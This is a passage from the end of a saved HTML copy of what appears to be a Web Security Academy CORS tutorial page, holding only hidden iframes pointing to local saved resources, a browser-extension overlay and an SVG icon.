style="position: fixed; bottom: 0px; left: 0px; display: none; width: 100%; height: 200px; z-index: 5000; border-style: none; background: none transparent;" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/saved_resource(3).html"></iframe><div id="nr-ext-capsule" style="display: none; z-index: 999999999; top: 70px; right: 34px; position: fixed; width: 340px; height: 136px;"><iframe id="nr-ext-frame" style="background: transparent; overflow: hidden; position: absolute; margin: 0px; width: 100%; height: 100%; top: 0px; right: 0px; border-style: none;" src="./What is CORS (cross-origin resource sharing)_ Tutorial &amp; Examples _ Web Security Academy_files/saved_resource(4).html"></iframe><div style="margin: 0px; z-index: 2000; width: 20px; height: 20px; padding: 2px; line-height: 14px; cursor: grab; background: transparent; position: absolute; display: block; left: 20px; top: 91px;"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" id="ext-bar-drag" style="fill: rgb(224, 230, 239); color: rgb(224, 230, 239);"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M11 18c0 1.1-.9 2-2 2s-2-.9-2-2 .9-2 2-2 2 .9 2 2zm-2-8c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0-6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm6 4c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"></path></svg></div></div></body></html>
